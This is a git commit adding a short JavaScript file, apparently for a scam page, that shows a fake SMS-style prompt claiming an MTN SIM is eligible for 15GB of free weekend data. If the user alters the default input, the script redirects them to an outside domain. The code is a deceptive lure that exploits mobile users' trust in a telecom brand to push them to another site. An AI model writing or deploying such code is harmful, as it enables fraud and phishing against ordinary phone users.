71eab0643cbf3432a72e22f3001354f103a6fd89
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-22 01:15:14 -0800

    Create mtnweekend-15gb-freedata.com.js

---
+++ mtnweekend-15gb-freedata.com.js
@@ -0,0 +1,5 @@
+var password = '15GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 15GB Free weekend Data MTN SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','15GB Free Data');
+if (password != '15GB Free Data') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
